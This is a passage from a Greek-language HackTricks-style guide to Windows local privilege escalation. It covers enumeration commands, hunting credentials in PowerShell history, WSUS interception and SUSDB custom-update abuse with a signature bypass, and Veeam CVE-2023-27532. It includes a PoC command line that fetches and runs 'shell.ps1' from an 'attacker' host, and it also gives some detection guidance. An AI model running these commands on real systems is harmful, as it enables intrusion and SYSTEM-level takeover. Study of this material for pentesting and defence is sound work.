# Τοπική κλιμάκωση προνομίων στα Windows

{{#include ../../banners/hacktricks-training.md}}

### **Καλύτερο εργαλείο για την αναζήτηση διανυσμάτων τοπικής κλιμάκωσης προνομίων στα Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Αυτή η σελίδα συγκεντρώνει τη γενική μεθοδολογία κλιμάκωσης προνομίων στα Windows από αρκετούς θεμελιώδεις οδηγούς.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Η πρακτική ροή απαρίθμησης βασίζεται επίσης σε κοινοτικά workshops και λίστες ελέγχου.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Το ιστορικό υλικό επιθέσεων περιλαμβάνει την παρουσίαση της DerbyCon για την κλιμάκωση προνομίων στα Windows.<sup>[[5]](#references)</sup>

## Αρχικές θεωρητικές έννοιες των Windows

### Access Tokens

**Αν δεν γνωρίζετε τι είναι τα access tokens των Windows, διαβάστε την παρακάτω σελίδα πριν συνεχίσετε:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Ανατρέξτε στην παρακάτω σελίδα για περισσότερες πληροφορίες σχετικά με τα ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Επίπεδα ακεραιότητας

**Αν δεν γνωρίζετε τι είναι τα επίπεδα ακεραιότητας στα Windows, διαβάστε την παρακάτω σελίδα πριν συνεχίσετε:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Μηχανισμοί ασφαλείας των Windows

Υπάρχουν διάφορα στοιχεία στα Windows που μπορούν να **εμποδίσουν την απαρίθμηση του συστήματος**, την εκτέλεση εκτελέσιμων αρχείων ή ακόμη και να **εντοπίσουν τις ενέργειές σας**. Πριν ξεκινήσετε την απαρίθμηση για κλιμάκωση προνομίων, πρέπει να **διαβάσετε** την παρακάτω **σελίδα** και να **απαριθμήσετε** όλους αυτούς τους **μηχανισμούς** **άμυνας**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Η φυσική πρόσβαση μπορεί επίσης να μετατρέψει μια επεξεργασία UEFI NVRAM εκτός σύνδεσης σε DMA πριν από την εκκίνηση και σε μια αλυσίδα τροποποίησης μνήμης των Windows με δικαιώματα `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / αθόρυβη ανύψωση δικαιωμάτων μέσω UIAccess

Οι διεργασίες UIAccess που εκκινούνται μέσω `RAiLaunchAdminProcess` μπορούν να χρησιμοποιηθούν καταχρηστικά για πρόσβαση σε High IL χωρίς προτροπές, όταν παρακάμπτονται οι έλεγχοι ασφαλούς διαδρομής του AppInfo. Δείτε εδώ τη ροή παράκαμψης UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Η διάδοση ρυθμίσεων μητρώου προσβασιμότητας του Secure Desktop μπορεί να χρησιμοποιηθεί καταχρηστικά για αυθαίρετη εγγραφή στο μητρώο με δικαιώματα SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Οι πρόσφατες εκδόσεις των Windows εισήγαγαν επίσης ένα μονοπάτι LPE μέσω **SMB αυθαίρετης θύρας**, όπου ένας τοπικός έλεγχος ταυτότητας NTLM με αυξημένα δικαιώματα ανακλάται μέσω μιας επαναχρησιμοποιημένης σύνδεσης SMB TCP:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Πληροφορίες συστήματος

### Απαρίθμηση πληροφοριών έκδοσης

Ελέγξτε αν η έκδοση των Windows έχει κάποια γνωστή ευπάθεια (ελέγξτε επίσης τις εγκατεστημένες ενημερώσεις κώδικα).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits εκδόσεων

Αυτός ο [ιστότοπος](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμος για την αναζήτηση λεπτομερών πληροφοριών σχετικά με ευπάθειες ασφαλείας της Microsoft. Αυτή η βάση δεδομένων περιέχει περισσότερες από 4.700 ευπάθειες ασφαλείας, αναδεικνύοντας τη **τεράστια επιφάνεια επίθεσης** που παρουσιάζει ένα περιβάλλον Windows.

**Στο σύστημα**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — καταγράφει το build του OS, τις εγκατεστημένες ενημερώσεις και πιθανά σχετικά advisories· επαληθεύστε το ακριβές προϊόν και τις ενημερώσεις που έχουν αντικαταστήσει παλαιότερες πριν θεωρήσετε ότι ένα εύρημα ισχύει.

Για ένα local exploit που αφορά συγκεκριμένη έκδοση, ελέγξτε την **αρχιτεκτονική της εκτελούμενης διεργασίας** καθώς και την αρχιτεκτονική του OS. Στα Windows 64-bit, μια διεργασία 32-bit υπόκειται σε [ανακατεύθυνση του συστήματος αρχείων WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): το `%windir%\System32` συνήθως αντιστοιχεί στον κατάλογο συστήματος 32-bit, ενώ το `%windir%\Sysnative` δίνει σε αυτή τη διεργασία πρόσβαση στον εγγενή κατάλογο συστήματος. Το alias δεν είναι διαθέσιμο σε διεργασία 64-bit. Ένα build του OS ή η απουσία μιας υποψήφιας ενημέρωσης KB δεν αποδεικνύει ότι είναι εφικτή η εκμετάλλευση· συγκρίνετε το τρέχον build, τις εγκατεστημένες ενημερώσεις ή όσες έχουν αντικαταστήσει παλαιότερες, την αρχιτεκτονική της διεργασίας και τις προϋποθέσεις του exploit με το [δελτίο ασφαλείας της Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) για το συγκεκριμένο ζήτημα.

**Τοπικά, με πληροφορίες συστήματος**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub αποθετήρια με exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Περιβάλλον

Υπάρχουν διαπιστευτήρια ή άλλες Juicy πληροφορίες αποθηκευμένες στις μεταβλητές περιβάλλοντος;

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Ιστορικό PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Αρχεία Transcript του PowerShell

Μπορείτε να μάθετε πώς να το ενεργοποιήσετε στο [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` είναι μόνο ένα παράδειγμα. Η [πολιτική καταγραφής PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) συνήθως αποθηκεύει αρχεία στον φάκελο Documents κάθε χρήστη, αλλά μια ρύθμιση `OutputDirectory` ή η εντολή `Start-Transcript -OutputDirectory` μπορεί να ανακατευθύνει τα αρχεία σε έναν κοινόχρηστο ή κρυφό φάκελο. Πριν εξετάσετε ένα transcript, ελέγξτε την ενεργή διαδρομή εξόδου και τα ACL του αρχείου: μπορεί να περιέχει ορίσματα εντολών και έξοδο, συμπεριλαμβανομένων διαπιστευτηρίων. Ένα αναγνώσιμο transcript είναι απλώς ένα lead, εκτός αν το περιεχόμενό του αποκαλύπτει μια αξιοποιήσιμη ταυτότητα με υψηλότερα προνόμια και η συγκεκριμένη ταυτότητα μπορεί να συνδεθεί στο σχετικό περιβάλλον.

### Καταγραφή Module του PowerShell

Καταγράφονται λεπτομέρειες των εκτελέσεων pipeline του PowerShell, συμπεριλαμβανομένων των εντολών που εκτελέστηκαν, των κλήσεων εντολών και τμημάτων των scripts. Ωστόσο, ενδέχεται να μην καταγράφονται πλήρεις λεπτομέρειες εκτέλεσης και αποτελέσματα εξόδου.

Για να το ενεργοποιήσετε, ακολουθήστε τις οδηγίες στην ενότητα "Transcript files" της τεκμηρίωσης, επιλέγοντας **"Module Logging"** αντί για **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Για να δείτε τα τελευταία 15 συμβάντα από τα αρχεία καταγραφής του PowersShell, μπορείτε να εκτελέσετε:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Καταγράφεται πλήρες αρχείο δραστηριοτήτων και όλου του περιεχομένου της εκτέλεσης του script, διασφαλίζοντας ότι κάθε μπλοκ κώδικα τεκμηριώνεται καθώς εκτελείται. Αυτή η διαδικασία διατηρεί ένα ολοκληρωμένο audit trail για κάθε δραστηριότητα, χρήσιμο για forensic analysis και την ανάλυση κακόβουλης συμπεριφοράς. Η τεκμηρίωση όλων των δραστηριοτήτων κατά την εκτέλεσή τους παρέχει λεπτομερείς πληροφορίες για τη διαδικασία.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Τα συμβάντα καταγραφής για το Script Block βρίσκονται στο Windows Event Viewer, στη διαδρομή: **Αρχεία καταγραφής εφαρμογών και υπηρεσιών > Microsoft > Windows > PowerShell > Λειτουργικά**.\
Για να δείτε τα 20 τελευταία συμβάντα, μπορείτε να χρησιμοποιήσετε:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Ρυθμίσεις Internet

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Δίσκοι

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Ένα HTTP endpoint WSUS αποτελεί ένδειξη για πιθανή υποκλοπή των metadata ενημερώσεων. Η εκμετάλλευση εξαρτάται επίσης από το αν ο client χρησιμοποιεί αυτόν τον WSUS server, αν ένας attacker μπορεί να υποκλέψει ή να ελέγξει την κίνησή του, καθώς και από την πολιτική εμπιστοσύνης ενημερώσεων και εγκατάστασης του client. Το URL από μόνο του δεν αποδεικνύει ότι μπορεί να επιτευχθεί εκτέλεση κώδικα. [Η Microsoft συνιστά τη χρήση TLS για τα metadata του WSUS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Ξεκινάτε ελέγχοντας αν το δίκτυο χρησιμοποιεί ενημέρωση WSUS χωρίς SSL, εκτελώντας την ακόλουθη εντολή στο cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ή τα ακόλουθα σε PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Αν λάβετε μια απάντηση όπως κάποια από τις παρακάτω:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Και αν τα `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ή `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ισούνται με `1`.

Όταν το `UseWUServer` είναι `1`, το Windows Update χρησιμοποιεί την παραμετροποιημένη υπηρεσία intranet. Αυτό επιβεβαιώνει μια προϋπόθεση για τη διαδρομή HTTP interception, αλλά δεν αποδεικνύει ότι είναι δυνατή η υποκλοπή, η αποδοχή κακόβουλων ενημερώσεων ή η εγκατάστασή τους με αυξημένα δικαιώματα. Όταν είναι `0`, το συγκεκριμένο παραμετροποιημένο endpoint WSUS δεν επιλέγεται από αυτή την πολιτική.

Για να εκμεταλλευτείτε αυτά τα vulnerabilities, μπορείτε να χρησιμοποιήσετε εργαλεία όπως τα [Wsuxploit](https://github.com/pimps/wsuxploit) και [pyWSUS ](https://github.com/GoSecure/pywsus)- πρόκειται για οπλισμένα scripts εκμετάλλευσης MiTM που εισάγουν «ψεύτικες» ενημερώσεις σε μη κρυπτογραφημένη κίνηση WSUS.

Διαβάστε την έρευνα εδώ:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Διαβάστε την πλήρη αναφορά εδώ**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Βασικά, αυτό είναι το ελάττωμα που εκμεταλλεύεται αυτό το bug:

> Αν έχουμε τη δυνατότητα να τροποποιήσουμε τον proxy του τοπικού χρήστη μας και το Windows Updates χρησιμοποιεί τον proxy που έχει παραμετροποιηθεί στις ρυθμίσεις του Internet Explorer, τότε μπορούμε να εκτελέσουμε το [PyWSUS](https://github.com/GoSecure/pywsus) τοπικά, ώστε να υποκλέψουμε τη δική μας κίνηση και να εκτελέσουμε κώδικα με αυξημένα δικαιώματα στο asset μας.
>
> Επιπλέον, επειδή η υπηρεσία WSUS χρησιμοποιεί τις ρυθμίσεις του τρέχοντος χρήστη, χρησιμοποιεί και το certificate store του. Αν δημιουργήσουμε ένα self-signed certificate για το hostname του WSUS και προσθέσουμε αυτό το certificate στο certificate store του τρέχοντος χρήστη, θα μπορούμε να υποκλέψουμε τόσο την κίνηση HTTP όσο και την κίνηση HTTPS του WSUS. Το WSUS δεν χρησιμοποιεί μηχανισμούς τύπου HSTS για να εφαρμόσει επικύρωση trust-on-first-use στο certificate. Αν το certificate που παρουσιάζεται είναι έμπιστο για τον χρήστη και έχει το σωστό hostname, η υπηρεσία θα το αποδεχτεί.

Μπορείτε να εκμεταλλευτείτε αυτό το vulnerability με το εργαλείο [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (μόλις κυκλοφορήσει).

### Ενημερώσεις WSUS που ελέγχονται από διαχειριστή

Υπάρχει ξεχωριστή διαδρομή όταν η τρέχουσα ταυτότητα μπορεί να **δημοσιεύει και να εγκρίνει** ενημερώσεις σε έναν server WSUS. Ελέγξτε την πραγματική συμμετοχή στην ομάδα `WSUS Administrators` του server και τυχόν ανατεθειμένα δικαιώματα WSUS, και έπειτα εντοπίστε την ομάδα υπολογιστών-πελατών που θα λάβει μια εγκεκριμένη ενημέρωση. Η [Microsoft απαιτεί δικαιώματα WSUS Administrator για την έγκριση ενημερώσεων](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) και [τεκμηριώνει τη σχέση εμπιστοσύνης για τη δημοσίευση](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): οι clients πρέπει να εμπιστεύονται το certificate υπογραφής που χρησιμοποιείται για περιεχόμενο που δημοσιεύεται τοπικά. Επιβεβαιώστε ότι η υποψήφια ενημέρωση είναι υπογεγραμμένη και γίνεται αποδεκτή, αφορά τον στόχο και εγκαθίσταται σε περιβάλλον με αυξημένα δικαιώματα, προτού τη θεωρήσετε διαδρομή κλιμάκωσης δικαιωμάτων. Μια τιμή HTTP `WUServer` ή ένα όνομα ομάδας από μόνα τους δεν αποδεικνύουν ότι ισχύουν αυτές οι προϋποθέσεις.

### Κατάχρηση προσαρμοσμένων ενημερώσεων SUSDB: payloads χωρίς υπογραφή μέσω `.txt`/`.esd`

Πρόκειται για διαφορετική αστοχία ορίων εμπιστοσύνης από την υποκλοπή σύνδεσης HTTP WSUS: η προϋπόθεση είναι να υπάρχει επαρκής πρόσβαση στις **stored procedures της βάσης δεδομένων WSUS (`SUSDB`)** για τη δημοσίευση και την έγκριση μιας προσαρμοσμένης ενημέρωσης. Μια πρακτική διαδρομή εισόδου είναι η μεταβίβαση λογαριασμού υπολογιστή WSUS upstream σε ξεχωριστό server MSSQL που φιλοξενεί τη `SUSDB`. Η ακριβής προϋπόθεση εξαρτάται από την ανάπτυξη, επομένως πρώτα απαριθμήστε τα δικαιώματα `EXECUTE` αντί να υποθέσετε ότι απαιτούνται δικαιώματα SQL administrator.<sup>[[38]](#references)[[39]](#references)</sup>

Για τη ξεχωριστή διαδρομή επίθεσης που μεταβιβάζει τον έλεγχο ταυτότητας client WSUS από HTTP/8530 σε LDAP, SMB ή AD CS, δείτε το [Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Δημιουργία, στόχευση και έγκριση της ενημέρωσης

Η ροή εργασίας των προσαρμοσμένων ενημερώσεων χρησιμοποιεί τις νόμιμες διαδικασίες WSUS ως περιορισμένο API δημοσίευσης. Οι σημαντικές μεταβάσεις κατάστασης είναι οι εξής:<sup>[[38]](#references)</sup>

| Στάδιο | Σχετικές stored procedures |
| --- | --- |
| Εισαγωγή μεταδεδομένων ενημέρωσης | `spImportUpdate` |
| Αποθήκευση προαπαιτούμενων, τοπικοποιημένων και εκτεταμένων τμημάτων XML | `spSaveXMLFragment` |
| Συσχέτιση του digest περιεχομένου με το URL που ελέγχεται από τον επιτιθέμενο | `spSetBatchURL` |
| Απαρίθμηση/δημιουργία ομάδας υπολογιστών και προσθήκη του client | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Έγκριση εγκατάστασης για αυτή την ομάδα | `spDeployUpdate` με `@actionID = 0` και `@isAssigned = 1` |

Το όνομα αρχείου, τα digests, το μέγεθος και ο handler `CommandLineInstallation` πρέπει να συμφωνούν σε όλα τα εισαγόμενα μεταδεδομένα/τμήματα. Αφού ορίσετε το URL περιεχομένου και την ομάδα-στόχο, η τελική έγκριση μοιάζει με την ακόλουθη· χρησιμοποιήστε νέα αναγνωριστικά ενημέρωσης, ομάδας και ανάπτυξης αντί να επαναχρησιμοποιήσετε τα GUID του παραδείγματος.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Παράκαμψη υπογραφής μέσω επέκτασης

Το WSUS κανονικά απορρίπτει αυθαίρετο μη υπογεγραμμένο εκτελέσιμο περιεχόμενο. Ωστόσο, στο `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, η διαδρομή .NET `VerifyFile` ορίζει τη σημαία ελέγχου πιστοποιητικού σε false όταν το παρεχόμενο όνομα αρχείου τελειώνει σε `.txt` ή `.esd`. Έτσι, παραλείπεται η `CheckCertificateSignature` χωρίς να έχει προηγουμένως αποδειχθεί ότι τα bytes είναι κείμενο ή νόμιμη εικόνα ESD. Επομένως, ένα αμετάβλητο PE με όνομα, για παράδειγμα, `payload.exe.txt` μπορεί να περάσει την επαλήθευση περιεχομένου και στη συνέχεια να εκκινηθεί από τον χειριστή εγκατάστασης της ενημέρωσης μέσω command line. Πρόκειται για σφάλμα σύγχυσης πολιτικής/τύπου, όχι για πλαστογράφηση υπογραφής.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging συμβατό με BITS και αυτοματοποίηση

Η κλήση του `spDeployUpdate` κάνει το WSUS να ανακτήσει το καταχωρισμένο περιεχόμενο. Η προέλευση πρέπει να ικανοποιεί τις απαιτήσεις HTTP του BITS: δεν αρκεί να είναι προσβάσιμο ένα URL, καθώς η μεταφορά χρησιμοποιεί αρχική ροή `HEAD`/`GET` και αιτήματα byte-range. Ένας server χωρίς υποστήριξη Range προκαλεί σφάλμα συγχρονισμού WSUS `EventId=364`, το οποίο αναφέρει ότι το BITS απαιτεί την κεφαλίδα πρωτοκόλλου Range.<sup>[[39]](#references)</sup>

Το ερευνητικό PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) δημιουργεί το SQL που απαιτείται για την αλυσίδα import/fragment/URL/group/deployment, περιλαμβάνει έναν τροποποιημένο MSSQL client για την εκτέλεσή του και παρέχει το `BitsWebServer.py` για το staging του περιεχομένου. Μια ελάχιστη εντολή εκτέλεσης σε εξουσιοδοτημένο lab είναι:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Μη επιτηρούμενη εκτέλεση και persistence μέσω επανάληψης

Η αλληλεπίδραση από την πλευρά του client εξαρτάται από την πολιτική. Η ρύθμιση `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, με την επιλογή `4 - Auto download and schedule install`, επιτρέπει τη λήψη και εγκατάσταση μιας εγκεκριμένης ενημέρωσης σύμφωνα με το ρυθμισμένο χρονοδιάγραμμα, χωρίς να χρειάζεται να την επιλέξει χειροκίνητα ο χρήστης. Κατά τις δοκιμές, ένα payload του οποίου η ενημέρωση παρέμενε αποτυχημένη/ημιτελής εμφανιζόταν ξανά αμέσως μετά τον τερματισμό της διεργασίας callback. Έτσι, η συμπεριφορά επανάληψης μπορεί να οδηγήσει σε επαναλαμβανόμενη persistence εκτέλεσης· είναι θορυβώδης, επειδή ο client εμφανίζει κατάσταση αποτυχίας ενημέρωσης.<sup>[[39]](#references)</sup>

#### Σημεία εστίασης για εντοπισμό και hardening

Χρήσιμα σημεία εστίασης στην πλευρά του server και του client για αυτή την αλυσίδα είναι τα εξής:<sup>[[39]](#references)</sup>

- Ελέγξτε για εκτέλεση των `spCreateTargetGroup`, `spSetBatchURL` και `spDeployUpdate` στη `SUSDB`. Διερευνήστε νέες ομάδες στόχευσης, εξωτερικές πηγές περιεχομένου, payload ενημερώσεων `.txt`/`.esd` και deployments από μη αναμενόμενους principals (ιδίως λογαριασμούς που δεν είναι λογαριασμοί υπολογιστών).
- Ελέγξτε το `C:\Program Files\Update Services\LogFiles` για τα `ContentSyncAgent`, `FileVerified`, το ανορθόγραφο `FileVerficationFailed` και το `EventId=364`. Συσχετίστε την επαλήθευση με την επέκταση του payload και το magic bytes του περιεχομένου, αντί να εμπιστεύεστε την κατάληξη.
- Αναζητήστε επαναλαμβανόμενες αποτυχίες/επαναλήψεις εγκατάστασης του Windows Update, καθώς και εκτέλεση PE ή μη αναμενόμενη δραστηριότητα child process/δικτύου από περιεχόμενο με ονόματα `.txt` ή `.esd`.
- Όπου υποστηρίζεται, απαιτήστε Extended Protection for Authentication στην υπηρεσία βάσης δεδομένων και περιορίστε την πρόσβαση στο δίκτυο της βάσης στον WSUS server και σε εξουσιοδοτημένα διαχειριστικά συστήματα. Περιορίστε στο ελάχιστο και ελέγχετε τα δικαιώματα `EXECUTE` στις stored procedures προσαρμοσμένων ενημερώσεων.

## Εργαλεία αυτόματης ενημέρωσης τρίτων και Agent IPC (local privesc)

Πολλοί εταιρικοί agents εκθέτουν μια επιφάνεια IPC σε localhost και ένα προνομιούχο κανάλι ενημέρωσης. Αν η διαδικασία enrollment μπορεί να εξαναγκαστεί να συνδεθεί σε server του attacker και το εργαλείο ενημέρωσης εμπιστεύεται ένα rogue root CA ή εφαρμόζει αδύναμους ελέγχους υπογραφής, ένας τοπικός χρήστης μπορεί να παραδώσει ένα κακόβουλο MSI, το οποίο εγκαθίσταται από την υπηρεσία SYSTEM. Δείτε εδώ μια γενικευμένη τεχνική (βασισμένη στην αλυσίδα Netskope stAgentSvc – CVE-2025-0309):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM μέσω TCP 9401)

Τα Veeam Backup & Replication και Cloud Connect χρησιμοποιούν μια βασική υπηρεσία backup στην **TCP/9401 από προεπιλογή**. Η [συμβουλευτική ανακοίνωση της Veeam](https://www.veeam.com/kb4424) περιγράφει μη εξουσιοδοτημένη αποκάλυψη διαπιστευτηρίων κρυπτογραφημένης βάσης δεδομένων διαμόρφωσης, εντός της περιμέτρου του δικτύου backup· ένα ξεχωριστό δημόσιο PoC παρουσιάζει μια διαδρομή εκτέλεσης εντολών ως **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Η υπηρεσία ενδέχεται να δεσμεύεται σε διεύθυνση πέρα από το localhost, επομένως ελέγξτε την πραγματική της διεύθυνση και το PID.

- **Recon**: επιβεβαιώστε ότι η TCP/9401 ανήκει στο `Veeam.Backup.Service.exe` και, στη συνέχεια, ελέγξτε το εγκατεστημένο προϊόν και τα metadata των patches. Τα `netstat -ano | findstr 9401` και `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` είναι ενδείξεις, όχι πλήρης έλεγχος patch.
- **Ελάχιστες εκδόσεις με τη διόρθωση**: Η Veeam αναφέρει τα **11a build 11.0.1.1261 P20230227** και **12 build 12.0.0.1420 P20230223** ως τις πρώτες διορθωμένες εκδόσεις· οι παλαιότερες εκδόσεις επηρεάζονται. Μια τετραμερής έκδοση αρχείου από μόνη της δεν αρκεί για να διακρίνει ένα μη διορθωμένο βασικό build από ένα μεταγενέστερο patch με τους ίδιους αριθμούς build. Επαληθεύστε το αναγνωριστικό patch στο [ιστορικό build του προμηθευτή](https://www.veeam.com/kb2680), προτού θεωρήσετε διορθωμένο ένα οριακό build.
- **Exploit**: τοποθετήστε ένα PoC, όπως το `VeeamHax.exe`, μαζί με τα απαιτούμενα DLL της Veeam στον ίδιο κατάλογο και, στη συνέχεια, ενεργοποιήστε ένα payload SYSTEM μέσω του τοπικού socket:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Το PoC που αναφέρεται δείχνει εκτέλεση εντολών ως SYSTEM όταν ισχύουν οι πρόσθετες προϋποθέσεις του· η συμβουλευτική ανακοίνωση του προμηθευτή περιγράφει το ζήτημα αποκάλυψης διαπιστευτηρίων.
## KrbRelayUp

